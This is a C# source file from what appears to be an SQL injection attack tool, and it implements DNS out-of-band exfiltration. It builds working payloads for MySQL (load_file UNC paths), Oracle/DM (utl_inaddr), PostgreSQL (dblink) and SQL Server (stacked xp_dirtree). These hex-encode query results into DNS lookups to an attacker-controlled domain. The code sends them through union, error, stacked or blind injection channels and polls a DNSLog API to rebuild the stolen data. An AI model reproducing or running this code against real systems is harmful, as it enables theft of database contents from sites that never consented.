using SuperSQLInjectionV2.Tools;
using SuperSQLInjectionV2.Tools.Http;
using SuperSQLInjectionV2.ViewModels;
using System;
using System.Threading.Tasks;

namespace SuperSQLInjectionV2.Models.Data
{
    /// <summary>
    /// DNS外带取数（dns-domain 能力）：无回显/慢盲注场景下，把查询结果hex编码分段，
    /// 由数据库自身触发对 "i{序号}.{hex段}.{DNSLog域名}" 的DNS解析请求，在DNSLog平台侧按序号拼回hex并解码。
    /// 与盲注不同：数据经DNS信道带出，每个分段只需一次HTTP请求。
    /// 各库触发方式：
    ///   MySQL(Windows目标): load_file('\\\\i1.hex.域名\\x')
    ///   Oracle/达梦:        utl_inaddr.get_host_address('i1.'||hex||'.域名')
    ///   PostgreSQL:         dblink('host=i1.hex.域名 ...')（需dblink扩展权限）
    ///   SQLServer(堆叠):    exec master..xp_dirtree '\\i1.hex.域名\x'
    /// </summary>
    public static class DnsExfilTool
    {
        /// <summary>每段hex字符数（DNS label上限63，留序号标签余量；48 hex=24字节原始数据）</summary>
        public const int SegLen = 48;

        /// <summary>该库是否已实现DNS外带payload（与BuildSegPayload的分支保持一致）</summary>
        public static bool IsSupported(DBType dbType) => dbType switch
        {
            DBType.MySQL or DBType.Oracle or DBType.DM
                or DBType.Kingbase or DBType.PostgreSQL or DBType.SQLServer => true,
            _ => false
        };

        /// <summary>
        /// 构造第index段（从1开始）的DNS外带触发表达式/语句，hex段由数据库侧计算：
        /// hex(substr((expr), (index-1)*SegLen+1, SegLen))
        /// </summary>
        public static string BuildSegPayload(DBType dbType, string expr, int index, string domain)
        {
            int start = (index - 1) * SegLen + 1;
            switch (dbType)
            {
                case DBType.MySQL:
                    return "load_file(concat('\\\\\\\\','i" + index + ".',hex(substr((" + expr + ")," + start + "," + SegLen + ")),'." + domain + "','\\\\x'))";
                case DBType.Oracle:
                case DBType.DM:
                    return "utl_inaddr.get_host_address('i" + index + ".'||rawtohex(utl_raw.cast_to_raw(substr((" + expr + ")," + start + "," + SegLen + ")))||'." + domain + "')";
                case DBType.Kingbase:
                case DBType.PostgreSQL:
                    return "(select 1 from dblink('host=i" + index + ".'||encode(substr((" + expr + ")," + start + "," + SegLen + ")::bytea,'hex')||'." + domain + " port=53 user=x password=x dbname=x','select 1') as t(i int))";
                case DBType.SQLServer:
                    //堆叠语句通道（需要堆叠注入点）；fn_varbintohexstr输出0x前缀的UTF-16LE hex
                    return ";declare @d nvarchar(400)='i" + index + ".'+substring(sys.fn_varbintohexstr(cast(substring(cast((" + expr + ") as nvarchar(200))," + start + "," + SegLen + ") as varbinary(max))),3,400)+'." + domain + "';exec master..xp_dirtree '\\\\'+@d+'\\x'--";
                default:
                    return "";
            }
        }

        /// <summary>
        /// 执行DNS外带：对expr按段逐段触发（每段一次HTTP请求）。
        /// maxChunks为最大段数（每个查询最多外带若干chunk，超过截断）。
        /// 返回触发的段数；未配置DNSLog域名或库类型不支持时返回0。
        /// 结果需在DNSLog平台按 i1/i2/... 顺序拼回hex并unhex（SQLServer为UTF-16LE编码）。
        /// </summary>
        public static async Task<int> SendDnsExfil(AppConfig config, string expr, int maxChunks = 8)
        {
            string domain = config.DataConfig.DnsLogDomain?.Trim ()?? "";
            if (string.IsNullOrEmpty(domain))
            {
                Log.Warning("未配置DNSLog域名，无法DNS外带！");
                return 0;
            }
            DBType dbType = config.DataConfig.SelectedDBType;
            //P2-8：内置DNS接收服务按配置惰性启停（幂等，配置不变不重启）
            DnsServerManager.EnsureState(config);
            int sent = 0;
            for (int i = 1; i <= maxChunks; i++)
            {
                config.CheckStop();
                string payload = BuildSegPayload(dbType, expr, i, domain);
                if (string.IsNullOrEmpty(payload))
                {
                    Log.Warning("数据库类型 " + dbType + " 暂不支持DNS外带！");
                    break;
                }
                await Trigger(config, payload).ConfigureAwait(false);
                sent++;
                Log.Show("DNS外带已触发第 " + i + " 段：i" + i + ".<hex(" + SegLen + ")>." + domain);
            }
            if (sent > 0)
            {
                Log.Warning("DNS外带完成（" + sent + "段，最多" + sent * SegLen / 2 + "字节），请到DNSLog平台按 i1/i2/... 拼回hex并解码！");
            }
            return sent;
        }

        /// <summary>
        /// DNS外带结果自动回收：触发后按 ceye 格式API轮询DNS解析记录，按 i1/i2/... 序号拼回hex并解码。
        /// 需配置 DataConfig.DnsLogApiToken（与DnsLogApiUrl模板）；轮询最长 maxWaitSec 秒，凑满 expectChunks 段提前返回。
        /// 解码编码：SQLServer为UTF-16LE（fn_varbintohexstr编码行为），其他库用当前设置的页面编码（默认UTF-8）。
        /// </summary>
        public static async Task<string> CollectFromDnsLog(AppConfig config, int expectChunks, int maxWaitSec = 30)
        {
            string token = config.DataConfig.DnsLogApiToken?.Trim ()?? "";
            string domain = config.DataConfig.DnsLogDomain?.Trim ()?? "";
            string apiTpl = config.DataConfig.DnsLogApiUrl?.Trim ()?? "";
            //P2-8：内置DNS接收服务运行时优先走本机内存记录（无需平台Token/API）
            DnsServerManager.EnsureState(config);
            var local = DnsServerManager.Current;
            if (local == null && (string.IsNullOrEmpty(token) || string.IsNullOrEmpty(domain) || string.IsNullOrEmpty(apiTpl)))
            {
                return "";
            }
            Uri uri = null!;
            if (local == null)
            {
                string url = apiTpl.Replace("{token}", token, StringComparison.Ordinal).Replace("{domain}", domain, StringComparison.Ordinal);
                if (!Uri.TryCreate(url, UriKind.Absolute, out uri!))
                {
                    Log.Warning("DNSLog API地址无效：" + url);
                    return "";
                }
            }

            var segHex = new System.Collections.Generic.SortedDictionary<int, string>();
            var sw = System.Diagnostics.Stopwatch.StartNew();
            while (sw.Elapsed.TotalSeconds < maxWaitSec)
            {
                config.CheckStop();
                try
                {
                    if (local != null)
                    {
                        ParseCeyeRecords(local.ToCeyeJson(domain), domain, segHex);
                    }
                    else
                    {
                        string reqTxt = "GET " + (string.IsNullOrEmpty(uri.PathAndQuery) ? "/" : uri.PathAndQuery) + " HTTP/1.1\r\n"
                            + "Host: " + uri.Host + (uri.IsDefaultPort ? "" : ":" + uri.Port) + "\r\n"
                            + "User-Agent: SuperSQLInjectionV2\r\nConnection: close\r\n\r\n";
                        var req = new HttpRequest(config, reqTxt);
                        req.IsSSL = uri.Scheme.Equals("https", StringComparison.OrdinalIgnoreCase);
                        req.Port = uri.Port;
                        HttpResponse resp = await HTTPTool.SendRequestRetryAsync(req).ConfigureAwait(false);
                        ParseCeyeRecords(resp?.BodyTxt ?? "", domain, segHex);
                    }
                }
                catch (Exception e)
                {
                    Log.SysLog("DNSLog记录拉取异常：" + e.Message);
                }
                if (segHex.Count >= expectChunks)
                {
                    break;
                }
                await Task.Delay(local != null ? 500 : 3000).ConfigureAwait(false);
            }
            if (segHex.Count == 0)
            {
                Log.Warning("DNSLog平台未回收到任何记录（等待" + maxWaitSec + "s）；可能目标无法出网或DNS未触发，请人工到平台确认！");
                return "";
            }
            string hex = string.Concat(segHex.Values);
            Log.Show("DNSLog自动回收 " + segHex.Count + " 段，hex长度=" + hex.Length);
            try
            {
                //SQLServer的fn_varbintohexstr是UTF-16LE字节hex
                string enc = config.DataConfig.SelectedDBType == DBType.SQLServer ? "UTF-16LE" : config.DataConfig.DbEncoding;
                return TextCodec.unHex(hex, enc);
            }
            catch (Exception e)
            {
                Log.Warning("DNSLog回收hex解码失败：" + e.Message + "，原始hex=" + hex);
                return hex;
            }
        }

        /// <summary>解析ceye格式JSON记录，把 i{n}.{hex}.{domain} 形态的段填进segHex（hex只取纯hex字符，防废标签污染）</summary>
        public static void ParseCeyeRecords(string json, string domain, System.Collections.Generic.SortedDictionary<int, string> segHex)
        {
            if (string.IsNullOrEmpty(json))
            {
                return;
            }
            try
            {
                using var doc = System.Text.Json.JsonDocument.Parse(json);
                if (!doc.RootElement.TryGetProperty("data", out var data) || data.ValueKind != System.Text.Json.JsonValueKind.Array)
                {
                    return;
                }
                var rx = new System.Text.RegularExpressions.Regex(
                    @"^i(\d+)\.([0-9a-fA-F]+)\." + System.Text.RegularExpressions.Regex.Escape(domain) + "$",
                    System.Text.RegularExpressions.RegexOptions.IgnoreCase);
                foreach (var item in data.EnumerateArray())
                {
                    if (!item.TryGetProperty("name", out var nameEl))
                    {
                        continue;
                    }
                    var m = rx.Match(nameEl.GetString ()?? "");
                    if (m.Success)
                    {
                        int idx = int.Parse(m.Groups[1].Value);
                        string hx = m.Groups[2].Value;
                        //同名段以先到为准（DNS缓存可能重复上报）
                        if (!segHex.ContainsKey(idx))
                        {
                            segHex[idx] = hx;
                        }
                    }
                }
            }
            catch (System.Text.Json.JsonException)
            {
                //非JSON响应（错误页/HTML）忽略，下轮重试
            }
        }

        /// <summary>
        /// DNS外带检测轮询（注入检测用）：每条payload携带唯一token，全部发完后统一调用本方法轮询DNSLog平台，
        /// 返回出现了解析记录的token集合（记录名形态为 token.域名）。命中哪个token即哪条payload触发了DNS解析。
        /// 需配置 DataConfig.DnsLogApiToken（与DnsLogApiUrl模板）；轮询最长 maxWaitSec 秒，全部命中提前返回。
        /// </summary>
        public static async Task<System.Collections.Generic.HashSet<string>> PollDnsLogForTokens(AppConfig config,
            System.Collections.Generic.HashSet<string> tokens, int maxWaitSec = 25)
        {
            var hits = new System.Collections.Generic.HashSet<string>(StringComparer.OrdinalIgnoreCase);
            string apiToken = config.DataConfig.DnsLogApiToken?.Trim ()?? "";
            string domain = config.DataConfig.DnsLogDomain?.Trim ()?? "";
            string apiTpl = config.DataConfig.DnsLogApiUrl?.Trim ()?? "";
            //P2-8：内置DNS接收服务运行时优先走本机内存记录
            DnsServerManager.EnsureState(config);
            var local = DnsServerManager.Current;
            if (tokens == null || tokens.Count == 0 || string.IsNullOrEmpty(domain)
                || (local == null && (string.IsNullOrEmpty(apiToken) || string.IsNullOrEmpty(apiTpl))))
            {
                return hits;
            }
            Uri uri = null!;
            if (local == null)
            {
                string url = apiTpl.Replace("{token}", apiToken, StringComparison.Ordinal).Replace("{domain}", domain, StringComparison.Ordinal);
                if (!Uri.TryCreate(url, UriKind.Absolute, out uri!))
                {
                    Log.Warning("DNSLog API地址无效：" + url);
                    return hits;
                }
            }
            string suffix = "." + domain;
            var sw = System.Diagnostics.Stopwatch.StartNew();
            while (sw.Elapsed.TotalSeconds < maxWaitSec && hits.Count < tokens.Count)
            {
                config.CheckStop();
                try
                {
                    if (local != null)
                    {
                        CollectTokenHits(local.ToCeyeJson(domain), suffix, tokens, hits);
                    }
                    else
                    {
                        string reqTxt = "GET " + (string.IsNullOrEmpty(uri.PathAndQuery) ? "/" : uri.PathAndQuery) + " HTTP/1.1\r\n"
                            + "Host: " + uri.Host + (uri.IsDefaultPort ? "" : ":" + uri.Port) + "\r\n"
                            + "User-Agent: SuperSQLInjectionV2\r\nConnection: close\r\n\r\n";
                        var req = new HttpRequest(config, reqTxt);
                        req.IsSSL = uri.Scheme.Equals("https", StringComparison.OrdinalIgnoreCase);
                        req.Port = uri.Port;
                        HttpResponse resp = await HTTPTool.SendRequestRetryAsync(req).ConfigureAwait(false);
                        CollectTokenHits(resp?.BodyTxt ?? "", suffix, tokens, hits);
                    }
                }
                catch (Exception e)
                {
                    Log.SysLog("DNSLog记录拉取异常：" + e.Message);
                }
                if (hits.Count >= tokens.Count)
                {
                    break;
                }
                await Task.Delay(local != null ? 500 : 3000).ConfigureAwait(false);
            }
            return hits;
        }

        /// <summary>解析ceye格式JSON记录，把 token.域名 形态的记录名对应token填进hits（允许平台返回更多级子域名，取 token 段匹配）</summary>
        private static void CollectTokenHits(string json, string suffix, System.Collections.Generic.HashSet<string> tokens,
            System.Collections.Generic.HashSet<string> hits)
        {
            if (string.IsNullOrEmpty(json))
            {
                return;
            }
            try
            {
                using var doc = System.Text.Json.JsonDocument.Parse(json);
                if (!doc.RootElement.TryGetProperty("data", out var data) || data.ValueKind != System.Text.Json.JsonValueKind.Array)
                {
                    return;
                }
                foreach (var item in data.EnumerateArray())
                {
                    if (!item.TryGetProperty("name", out var nameEl))
                    {
                        continue;
                    }
                    string name = nameEl.GetString ()?? "";
                    if (!name.EndsWith(suffix, StringComparison.OrdinalIgnoreCase))
                    {
                        continue;
                    }
                    //去掉 .域名 后缀后，逐段匹配token（DNS缓存可能多级上报）
                    string head = name.Substring(0, name.Length - suffix.Length);
                    foreach (string label in head.Split('.'))
                    {
                        if (tokens.Contains(label) && !hits.Contains(label))
                        {
                            hits.Add(label);
                        }
                    }
                }
            }
            catch (System.Text.Json.JsonException)
            {
                //非JSON响应（错误页/HTML）忽略，下轮重试
            }
        }

        /// <summary>经当前注入通道让DB执行外带表达式/语句（不关注回显）</summary>
        private static async Task Trigger(AppConfig config, string payload)
        {
            switch (config.DataConfig.SelectedInjectType)
            {
                case InjectType.Union:
                    await DataComm.DataDumpWithNoFrom(config, payload).ConfigureAwait(false);
                    break;
                case InjectType.Error:
                    await DataComm.DataDumpWithError(config, payload).ConfigureAwait(false);
                    break;
                case InjectType.Stacked:
                    //堆叠通道：表达式包装为select语句堆叠执行；以分号开头的语句片段（如xp_dirtree外带）去分号后直接堆叠
                    string stmt = payload.StartsWith(';') ? payload.Substring(1) : "select " + payload;
                    await DataComm.RunStackedSql(config, stmt).ConfigureAwait(false);
                    break;
                default:
                    if (payload.StartsWith(';'))
                    {
                        //堆叠语句片段（如SQLServer xp_dirtree外带），补1=1闭合and条件后拼入
                        await DataComm.RunStackedSql(config, payload.Substring(1)).ConfigureAwait(false);
                    }
                    else
                    {
                        //盲注通道：作为bool条件触发一次（表达式返回值不影响页面判断）
                        await DataComm.GetBoolValue(config, "(" + payload + ") is not null or 1=1", 1, 1).ConfigureAwait(false);
                    }
                    break;
            }
        }
    }
}
